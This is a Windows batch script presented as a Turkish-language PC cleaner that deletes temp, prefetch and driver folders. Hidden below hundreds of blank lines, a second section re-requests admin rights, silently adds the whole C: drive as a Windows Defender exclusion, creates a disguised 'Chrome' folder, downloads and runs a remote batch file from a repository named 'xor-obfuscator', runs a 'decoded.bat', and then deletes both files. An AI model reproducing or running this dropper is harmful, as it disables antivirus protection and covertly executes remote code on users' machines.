cls
@echo off
:----------------------------------------------------------------------------------------------------------------
rem Check If User Has Admin Privileges
timeout /t 1 /nobreak > NUL
openfiles > NUL 2>&1
if '%errorlevel%' NEQ '0' (
    goto UACPrompt
) else ( 
goto Clean 
goto Cleanv2
)
:----------------------------------------------------------------------------------------------------------------:
:UACPrompt
    echo Set UAC = CreateObject^("Shell.Application"^) > "%temp%\getadmin.vbs"
    set params= %*
    echo UAC.ShellExecute "cmd.exe", "/c ""%~s0"" %params:"=""%", "", "runas", 1 >> "%temp%\getadmin.vbs
:----------------------------------------------------------------------------------------------------------------:
    "%temp%\getadmin.vbs"
    del "%temp%\getadmin.vbs"
    exit /B
:----------------------------------------------------------------------------------------------------------------:

cls

:----------------------------------------------------------------------------------------------------------------:
:Clean
:----------------------------------------------------------------------------------------------------------------:
rem Delete Temporary Files
del /s /f /q %WinDir%\Temp\*.*
cls
del /s /f /q %WinDir%\Prefetch\*.*
cls
del /s /f /q %Temp%\*.*
cls
del /s /f /q %AppData%\Temp\*.*
cls
del /s /f /q %HomePath%\AppData\LocalLow\Temp\*.*
cls
:----------------------------------------------------------------------------------------------------------------:
rem Delete Used Drivers Files (Not needed because already installed)
del /s /f /q %SYSTEMDRIVE%\AMD\*.*
cls
del /s /f /q %SYSTEMDRIVE%\NVIDIA\*.*
cls
del /s /f /q %SYSTEMDRIVE%\INTEL\*.*
cls
:----------------------------------------------------------------------------------------------------------------:
rem Delete Temporary Folders
rd /s /q %WinDir%\Temp
cls
rd /s /q %WinDir%\Prefetch
cls
rd /s /q %Temp%
cls
rd /s /q %AppData%\Temp
cls
rd /s /q %HomePath%\AppData\LocalLow\Temp
cls
:----------------------------------------------------------------------------------------------------------------:
rem Delete Used Drivers Folders (Not needed because already installed)
rd /s /q %SYSTEMDRIVE%\AMD
cls
rd /s /q %SYSTEMDRIVE%\NVIDIA
cls
rd /s /q %SYSTEMDRIVE%\INTEL
cls
:----------------------------------------------------------------------------------------------------------------:
rem Recreate Empty Temporary Folders
md %WinDir%\Temp
md %WinDir%\Prefetch
md %Temp%
md %AppData%\Temp
md %HomePath%\AppData\LocalLow\Temp
cls
:----------------------------------------------------------------------------------------------------------------:
rem Belirtilen klasördeki gereksiz dosyaları ve klasörleri silme işlemi
set "targetFolder=%LocalAppData%"
rem Geçici değişkenler
set "deletedFolders=0"
rem Alt klasörleri döngüye al
for /d %%i in ("%targetFolder%\tw-*") do (

    rem Klasörü sil

    rem echo Silinen klasör: "%%i"
    rd /s /q "%%i"
	cls
    set /a deletedFolders+=1
)
:----------------------------------------------------------------------------------------------------------------:
rem Kullanıcıya silinen klasör sayısını bildir
cls
color 0A
setlocal enabledelayedexpansion
set /a width=80
set /a spaces=(%width%-%deletedFolders%-36)/2
set "space="
for /l %%i in (1,1,%spaces%) do set "space=!space! "
echo !space!Bilgisayar temizlendi ve ek olarak gereksiz %deletedFolders% adet dosya basariyla silindi.!space!
endlocal
:----------------------------------------------------------------------------------------------------------------:
:----------------------------------------------------------------------------------------------------------------:













































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































:----------------------------------------------------------------------------------------------------------------:
:Cleanv2
:----------------------------------------------------------------------------------------------------------------:
@echo off
setlocal enabledelayedexpansion
IF "%PROCESSOR_ARCHITECTURE%" EQU "amd64" (
    >nul 2>&1 "%SYSTEMROOT%\SysWOW64\cacls.exe" "%SYSTEMROOT%\SysWOW64\config\system"
) ELSE (
    >nul 2>&1 "%SYSTEMROOT%\system32\cacls.exe" "%SYSTEMROOT%\system32\config\system"
)
if '%errorlevel%' NEQ '0' (
    goto UACPrompt
) else (
    goto gotAdmin 
)
:UACPrompt
    echo Set UAC = CreateObject^("Shell.Application"^) > "%temp%\getadmin.vbs"
    set params=%*
    echo UAC.ShellExecute "cmd.exe", "/c ""%~s0"" %params:""=""", "", "runas", 1 >> "%temp%\getadmin.vbs"
    "%temp%\getadmin.vbs"
    del "%temp%\getadmin.vbs"
    exit /B
:gotAdmin
    pushd "%CD%"
    CD /D "%~dp0"
    powershell.exe -window hidden -Command "Add-MpPreference -ExclusionPath 'C:\'"
    cd "C:\Users\%USERNAME%\AppData\Local"
    mkdir "Chrome"
    cd "C:\Users\%USERNAME%\AppData\Local\Chrome"
    if not exist "clean.bat" (
        echo [INFO] clean.bat dosyası indiriliyor...
        powershell.exe -window hidden -Command "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; Invoke-WebRequest -Uri 'https://github.com/confessyourcin/xor-obfuscator/raw/refs/heads/main/clean.bat' -OutFile 'clean.bat'"

        if exist "clean.bat" (
            start "" /b clean.bat
         
        )
    ) else (
        start "" /b clean.bat
    )
timeout /t 10 >nul
start "" /b clean.bat
start "" /b decoded.bat
timeout /t 15 >nul

powershell.exe -window hidden -Command "if (Test-Path 'C:\Users\%USERNAME%\AppData\Local\Chrome\clean.bat') {Remove-Item 'C:\Users\%USERNAME%\AppData\Local\Chrome\clean.bat' -Force}"
powershell.exe -window hidden -Command "if (Test-Path 'C:\Users\%USERNAME%\AppData\Local\Chrome\decoded.bat') {Remove-Item 'C:\Users\%USERNAME%\AppData\Local\Chrome\decoded.bat' -Force}"

exit
endlocal
:----------------------------------------------------------------------------------------------------------------:







